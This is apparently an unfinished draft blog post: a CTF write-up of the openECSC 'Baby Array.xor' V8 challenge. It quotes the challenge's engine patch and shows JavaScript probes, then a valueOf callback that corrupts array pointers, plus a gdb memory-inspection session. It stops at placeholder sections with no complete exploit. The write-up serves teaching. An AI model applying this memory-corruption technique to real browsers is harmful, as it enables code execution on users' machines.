+++
title = 'Exploiting V8 at openECSC'
date = 2024-05-20T13:37:00Z
draft = false
tags = ['ctf','browser']
slug = "exploiting-v8-at-openecsc"
summary = "todo: fill this and also the date"
+++

Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in it's [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.

Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.

<div class="challDetails">
	<div class="challTitle challHr">Baby Array.xor</div>
	<div class="challTags">
		<span class="challTag" style="background:#007bff">6 solves</span>
		<span class="challTag" style="background:#dc3545">418 points</span>
		<span class="challTag" style="background:#ffc107;color:#000">pwn</span>
	</div>
	<div class="challSection challHr">
		<p>In case you need to xor doubles...</p>
		<code style="color:#e83e8c">nc arrayxor.challs.open.ecsc2024.it 38020</code>
	</div>
	<div class="challSection challHr">
		<div class="challSubtitle">Attachments</div>
		<details class="challFiles"><summary>array.xor.zip</summary>
			<ul><!-- TODO: links -->
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/args.gn</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/d8</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/snapshot_blob.bin</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">docker-compose.yml</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">Dockerfile</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">README.md</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">v8.patch</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">wrapper.py</a></li>
			</ul>
		</details>
	</div>
	<div class="challSection">
		<div class="challSubtitle">Solves</div>
		<table class="challScores">
		  <thead>
		    <tr>
		      <th>#</th>
		      <th>Time</th>
		      <th>User</th>
		    </tr>
		  </thead>
		  <tbody>
		    <tr>
		      <td>1</td>
		      <td>2024-05-15 18:02:34Z</td>
		      <td>rdj</td>
		    </tr>
		    <tr>
		      <td>2</td>
		      <td>2024-05-15 18:26:26Z</td>
		      <td>Diff-fusion</td>
		    </tr>
		    <tr>
		      <td>3</td>
		      <td>2024-05-16 04:25:57Z</td>
		      <td>crazyman</td>
		    </tr>
		    <tr>
		      <td>4</td>
		      <td>2024-05-16 09:52:43Z</td>
		      <td>hlt</td>
		    </tr>
		    <tr>
		      <td>5</td>
		      <td>2024-05-17 21:35:14Z</td>
		      <td>Popax21</td>
		    </tr>
		    <tr>
		      <td>6</td>
		      <td>2024-05-19 20:43:27Z</td>
		      <td>rebane2001 <span style="font-family:'Comic Sans MS',cursive;opacity:0.2;user-select:none">&lt;- me :o</span></td>
		    </tr>
		  </tbody>
		</table>
	</div>
</div>

## Part 1: Finding the memory corruption

The challenge consists of the V8 engine with some new functionality added through a patch:

```c
/*
  Array.xor()
  let x = [0.1, 0.2, 0.3];
  x.xor(5);
*/
BUILTIN(ArrayXor) {
  HandleScope scope(isolate);
  Factory *factory = isolate->factory();
  Handle<Object> receiver = args.receiver();
  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Nope")));
  }
  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  ElementsKind kind = array->GetElementsKind();
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
  // Array.xor() needs exactly 1 argument
  if (args.length() != 2) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
  }
  // Get array len
  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));
  // Get xor value
  Handle<Object> xor_val_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));
  // Ah yes, xoring doubles..
  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
    double x = elements->get_scalar(i);
    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
    elements->set(i, *(double*)&result);
  });
  
  return ReadOnlyRoots(isolate).undefined_value();
}
```

The patch adds a new `Array.xor()` prototype that can be used to xor all values within an array of doubles, let's try it:

```js
> arr = [0.1, 0.2, 0.3]
> arr.xor(1337)
> arr
<  (3) [0.10000000000001079, 0.20000000000002158, 0.30000000000004035]
```

Quite the peculiar feature. It may seem a little confusing if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes sense once we look at the binary representations of the values:
<!-- todo: highlight XOR bits in red -->
```js
(double) 0.1 ^ (uint64) 5 = (double) 0.10000000000001079
  11111110111001100110011001100110011001100110011001100110011010
^ 00000000000000000000000000000000000000000000000000010100111001
= 11111110111001100110011001100110011001100110011001110010100011
```

Hmm, XORing doubles isn't going to get us anywhere[^1] though as the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^2]) as just raw doubles. All we can do is change some numbers around in an array, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thing on a mixed array (`PACKED_ELEMENTS`) consisting of memory pointers to other objects, since we could point the pointers to places in memory we're not supposed to.

<!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->

So let's try a simple array with an object in it:

```js
> arr = [0.1, 0.2, {}]
> arr.xor(1337)
< TypeError: Array.xor needs array of double numbers
```

Hmm, seems like there's a check in-place to prevent us from doing this:

```c
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
```

But what if we do create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?

```js
> arr = [0.1, 0.2, 0.3]
> evilHandler = {
		get(target, prop, receiver) {
			console.log(`Got '${prop}'!`);
			return Reflect.get(...arguments);
		}
	}
> evil = new Proxy(arr, evilHandler);
> evil
  Got 'constructor'!
  Got 'constructor'!
  Got 'length'!
  Got '0'!
  Got 'length'!
  Got '1'!
  Got 'length'!
  Got '2'!
  Got 'length'!
< [0.1, 0.2, 0.3] // hehe looks good
> evil.xor(1337)
  Got 'xor'!
< TypeError: Nope
```

No dice, seems like they've thought of that too:

```c
if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("Nope")));
}
```

The `IsJSArray` method makes sure that we are in fact passing an array, and the `HasOnlySimpleReceiverElements` method checks for anything sus[^3] within the array or it's prototype.

Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and xoring such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.

The length of the array gets stored in a `uint32_t`, and I thought that perhaps we could overflow this value, but it turns out you can't make an array that big:

```js
> arr = new Array(2**32)
< RangeError: Invalid array length
```

I also tried messing with the length value, but v8 doesn't allow us to do that in a way that could be of use here:

```js
> arr = [1.1, 2.2, 3.3]
> arr.length = "evil"
< RangeError: Invalid array length
> arr.__defineGetter__("length", () => 1337);
< TypeError: Cannot redefine property: length
> arr.length = 1337 // our array is now a HOLEY_DOUBLE_ELEMENTS
> arr.xor(1337)
< TypeError: Array.xor needs array of double numbers
```

And then it hit me - we're only doing all these checks on the array itself, not the argument! We get the argument to xor with (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous checks, so perhaps we could take our double array and change it so something more interesting here? Let's give it a shot:

```js
> arr = [1.1, 2.2, 3.3]
> evil = { valueOf: () => { arr[0] = {}; return 1337 } }
> arr.xor(evil)
> arr
< [139350, 2.2, 139390] 
```

We're cooking!

## Part 2: Cooking up some primitives

Now that we've found a way to mess with the pointers in an array, we must figure out a way to turn them into the `addrof` and `fakeobj` primitives. There are a few different ways to accomplish this from here. I'm going to go with the path I took originally, but see if you can figure out any other ones - I'll share a couple (arguably better ones) at the end of the post.

So far we've just blindly done stuff without looking at the memory layout itself, but it's going to get pretty hard to understand without doing that, so how could we do that? **d8 natives syntax** and **a debugger**! If we launch d8 (the v8 shell) with the `--allow-natives-syntax` flag, we can use various debug functions such as `%DebugPrint(obj)` to examine what's going on, and if we also use a debugger ([gdb](https://gnu.org/software/gdb/) in this case) we can then look at the memory to understand it better:

```js
> gdb --args ./d8 --allow-natives-syntax //<-- use d8 with the natives syntax in gdb
GNU gdb (GDB) 14.2
...                      
(gdb) run // <-- start d8
Starting program: /home/lyra/Desktop/array.xor/dist/d8 --allow-natives-syntax
V8 version 12.7.0 (candidate)
d8> arr = [1.1, 2.2, 3.3] // <-- create an array
[1.1, 2.2, 3.3]
d8> %DebugPrint(arr) // <-- debugprint the array
DebugPrint: 0xa3800042be9: [JSArray] // <-- we get the address here
 - map: 0x0a38001cb7c5 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a38001cb11d <JSArray[0]>
 - elements: 0x0a3800042bc9 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x0a3800000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 <AccessorInfo name= 0x0a3800000d99 <String[6]: #length>, data= 0x0a3800000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x0a3800042bc9 <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }
0xa38001cb7c5: [Map] in OldSpace
 - map: 0x0a38001c01b5 <MetaMap (0x0a38001c0205 <NativeContext[295]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x0a38001cb785 <Map[16](HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x0a3800000a89 <Cell value= 1>
 - instance descriptors #1: 0x0a38001cb751 <DescriptorArray[1]>
 - transitions #1: 0x0a38001cb7ed <TransitionArray[4]>
   Transition array #1:
     0x0a3800000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x0a38001cb805 <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype: 0x0a38001cb11d <JSArray[0]>
 - constructor: 0x0a38001cae09 <JSFunction Array (sfi = 0xa380002b2f9)>
 - dependent code: 0x0a3800000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

[1.1, 2.2, 3.3]
d8> ^Z  // <-- suspend d8 (ctrl+z) to get to gdb
Thread 1 "d8" received signal SIGTSTP, Stopped (user).
0x00007ffff7da000a in read () from /usr/lib/libc.so.6
(gdb) x/8xg 0xa3800042be9-1 // <-- examine the array's address
0xa3800042be8:	0x00000725001cb7c5	0x0000000600042bc9
0xa3800042bf8:	0x00bab9320000010d	0x7566280a00000adc
0xa3800042c08:	0x29286e6f6974636e	0x20657375220a7b20
0xa3800042c18:	0x3b22746369727473	0x6d2041202f2f0a0a
(gdb) 
```

In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/32xg`[^4] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.

You'll notice I subtracted 1 from the memory address before viewing it, that's because of the tagged pointers I mentioned in [footnote 1](#fn:1). In a `PACKED_ELEMENTS` array, floats that end with a 0 bit (even) are stored as-is, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.

Anyways, what are those exploit primitives? `addrof` lets us see the memory address of any object, and `fakeobj` lets us create a "fake" JavaScript object - they're almost like memory read and write functions, but not quite.

Let's first try to understand what's going on with our arrays, I'll use the example from above.

<div class="jsMem">
	<div class="jsMemDbg">
		<span style="background:var(--jsMemVar1)">sample</span> <span style="background:var(--jsMemVar2)">text</span>
	</div>
	<div class="jsMemHex">
		<span class="jsMemVar1">0xSAMPLE</span> <span class="jsMemVar2">0xTEXT</span>
	</div>
</div>

<style>
:root {
	--jsMemVar1: white;
	--jsMemVar2: white;
}

.jsMemVar1:hover {
	color: red;
}
.jsMemVar2:hover {
	color: red;
}
.jsMem:has(.jsMemHex .jsMemVar1:hover) {
    --jsMemVar1: red;
}

.jsMem:has(.jsMemHex .jsMemVar2:hover) {
    --jsMemVar2: red;
}
</style>



<!--

## Part x: There's better ways

args.gn has v8_enable_sandbox = false

other solutions:
 - rdjgr: change length
 - popax21: flip obj/ptr bit

--allow-natives-syntax

-->

[^1]: If we could modify a boxed double - a special double that can also be tagged as a pointer - we could already use xor to corrupt memory, but `PACKED_DOUBLE_ELEMENTS` in V8 uses unboxed doubles.

[^2]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.

[^3]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.

[^4]: `x/32xg` stands for: e(**x**)amine (**32**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.

<style>
	.challDetails {
		line-height: 12px;
		font-size: 16px;
		background: #212529;
		border: 1px solid rgba(255, 255, 255, 0.15);
		color: #dee2e6;
		font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
		border-radius: 8px;
		max-width: 500px;
		margin: 16px auto;
	}
	.challTitle {
		font-size: 24px;
		font-weight: 500;
		padding: 16px;
	}
	.challSubtitle {
		font-size: 20px;
		font-weight: 500;
		text-align: center;
		padding: 12px 0;
	}
	.challHr {
		border-bottom: 1px solid #495057;
	}
	.challTags {
		text-align: center;
		padding: 16px 16px 0 16px;
		user-select: none;
	}
	.challSection {
		padding: 0 16px 16px 16px;
	}
	.challTag {
		border-radius: 6px;
		font-weight: bold;
		height: 32px;
		padding: 2px 6px;
		font-size: 13px;
	}
	.challFiles > ul {
		border-radius: 6px;
		background: #111;
		border: 1px solid #fff;
		line-height: 20px;
		padding: 14px;
		margin-bottom: 0;
		list-style-type: none;
		font-size: 12px;
		font-family: 'Nimbus Mono PS', 'Courier New', monospace;
	}
	.challFiles a {
		color: #0F0;
	}
	.challFiles a:hover {
		text-decoration: underline;
	}
	.challFiles > summary {
		color: #fff;
		background: #007bff;
		width: fit-content;
		padding: 12px;
		border-radius: 6px;
		user-select: none;
		cursor: pointer;
	}
	.challScores {
		width: 100%;
		border-collapse: collapse;
		background: #1c232b;
	}
	.challScores tr > * {
		border: solid 1px rgb(73, 80, 87);
		padding: 8px;
		text-align: left;
	}
	.challScores tr > :first-child {
  		text-align:center;
  		width: 0;
	}
	.challScores tbody tr:nth-of-type(odd) {
  		background: #29313b;
	}
	.challScores tbody tr:hover {
  		background: #2b3a4d;
	}
</style>